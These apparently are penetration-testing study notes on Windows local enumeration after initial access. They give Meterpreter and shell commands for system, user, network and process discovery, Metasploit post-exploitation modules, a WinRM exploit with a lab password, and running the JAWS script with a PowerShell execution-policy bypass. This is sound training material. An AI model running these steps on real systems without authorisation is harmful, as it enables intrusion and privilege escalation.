# 2 - Windows Local Enumeration

## <mark style="color:red;">Enumerating System Information</mark>

* After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is very useful as it gives us an idea of what we can do and what type of exploits we can run.
* What are we looking for?
  * Host-name.
  * OS Name (Windows 7, 8, etc).
  * OS Build & Service Pack (Windows 7 SP1 7600).
  * OS Architecture (x64/x86).
  * Installed Updates/Hot-fixes.

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we used the Rejetto vuln to gain initial access (search rejetto, use 0).

meterpreter > getuid # Return username.
meterpreter > sysinfo #Return system info like hostname, architecture etc.
meterpreter > show_mount # displays mounted drives.

shell > hostname # Return hostname.
shell > systeminfo # Return every OS info like build number, service pack, hotfixes etc.
shell > wmic qfe get Caption,Description,HotFixID,InstalledOn # Return in-depth info about hotfixes and installation dates.We are more concerned with "Security Updates".
shell > cat C:\\Windows/System32/eula.txt # Provide other system info (Might not be in every Windows system).
```
{% endcode %}



## <mark style="color:red;">Enumerating Users & Groups</mark>

* After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system.
* What are we looking for?
  * Current user & privileges
  * Additional user information
  * Other users on the system
  * Groups
  * Members of the built-in administrator group

**Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we use the rejetto vuln to gain initial access.

meterpreter > getuid # Return username.
meterpreter > getprivs # Return current user privileges.

msf5 > use post/windows/gather/enum_logged_on_users # Return currently and recently logged on users.

shell > whoami # Return hostname and current user.
shell > whoami /priv #Return current privileges.
shell > query user # Return currently logged on users.
shell > net users # Return users accounts created on the system.
shell > net user <userAccount> # Return additional info about a particular user.
shell > net localgroup # Enumerate every localgroup on the system
shell > net localgroup <group> # Enumerate every member part of a localgroup
```
{% endcode %}



## <mark style="color:red;">Enumerating Network Information</mark>

* What are we looking for?
  * Current IP address & network adapter
  * Internal networks
  * TCP/UDP services running and their respective ports
  * Other hosts on the network
  * Routing table
  * Windows Firewall state

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
# exploit rejetto to gain initial access.

shell > ipconfig #Enumerate IP and adapters info.
shell > ipconfig /all #Enumerate in-depth IP and adapters info.
shell > route print #Display the routing table
shell > arp -a #Display the arp table (every other devices connected on the network)
shell > netstat -ano #Return running services and their corresponding ports
shell > netsh firewall show state #Display firewall state (Might want to use "netsh advfirewall show")
shell > netsh advfirewall show # a more recent cmd. check if FW is enabled or disabled.
```
{% endcode %}



## <mark style="color:red;">Enumerating Processes & Services</mark>

* After gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and scheduled tasks are currently running.
* What are we looking for?
  * Running processes & services
  * Scheduled tasks
* A process is an instance of a running executable (.exe) or program.
* A service is a process which runs in the background and does not interact with the desktop.

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Rejetto for initial access.

meterpreter > ps # List the running processes.
meterpreter > pgrep <processName> # Return the PID of the process asked.
meterpreter > migrate <PID> #Migrate to another process

shell > net start # List started services.
shell > wmic service list brief #List in-depth services
shell > tasklist /svc #List running processes and their correspondant services
shell > schtasks /query /fo LIST /v # List scheduled tasks ( /v for additional info)
```
{% endcode %}





## <mark style="color:red;">Automating Windows Local Enumeration</mark>

* In addition to performing local enumeration manually, we can also automate the process with the help of a few scripts and MSF modules.
* While local enumeration techniques/commands are important to know, as a penetration tester, you will need to be time efficient. As a result, you will need to learn how to utilize various automated enumeration scripts.
* In addition to automating the process of enumerating information like system information, users & groups etc, these automated enumeration scripts will also provide you with additional information regarding the target system like; privilege escalation vulnerabilities, locally stored passwords, etc.

### **Windows Local Enum Scripts**

* **JAWS** - Just Another Windows (Enum) Script - JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so ‘should’ run on every Windows version since Windows 7.

→ GitHub Repo: [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)

### **Practical Demonstration**

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we used Metasploit module (eploit/windows/winrm/winrm_scrips_exec) to gain initial access. [set RHOSTS, USERNAME-administrator, PASSWORD-tinkerbell, FALSE_VBS-true). we get a 

meterpreter > show_mount #Display drives on the target system

# some post exploitation modules.
msf5 > use post/windows/gather/win_privs #Perform privileges enumeration
msf5 > use post/windows/gather/enum_logged_on_users #Enumerate current and recently logged on users
msf5 > use post/windows/gather/checkvm #Check if the target system is running in a VM
msf5 > use post/windows/gather/enum_applications #Enumerate every application installed on the target system

# other post exploitation modules.
msf5 > use post/windows/gather/enum_computers #Enumerate computers in the primary domain.
msf5 > use post/windows/gather/enum_patches #Enumerate patches installed on the target system
msf5 > use post/windows/gather/enum_shares #Enumerate shares.


#To use JAWS, upload the script onto the target system, open a shell and navigated to it's directory.
shell > powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt # Execute the JAWS scripts and output the results into a .txt file.
```
{% endcode %}

### Exploiting WinRM

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV -p 5985 10.2.21.181 # nmap scan for winRM.

msfconsole
use exploit/windows/winrm/winrm_script_exec
set RHOSTS, USERNAME, PASSWORD, set FORCE_VBS true.

# post exploitation modules
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
```
{% endcode %}

### Using JAWS powershell script for automatic enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
# goto the github repo https://github.com/411Hall/JAWS
# paste the raw content into the lab environment.
# create a .ps1 file and paste the content of the code, then upload to the Temp folder of the victim.

# spawn a cmd prompt shell session.
# bypass powershell execution policy.
powershell.exe -ExecutionPolicy Bypass -File .\jaws.ps1 -OutputFilename jaws.txt

# after enumeration, go back to the meterpreter session and download.
download jaws.txt
```
{% endcode %}

### <mark style="color:red;background-color:yellow;">Copy and Paste in to and from the Lab Environment</mark>

`ctrl + shift + alt` - once you can view your copied content, then you can paste  it in the Lab environment.

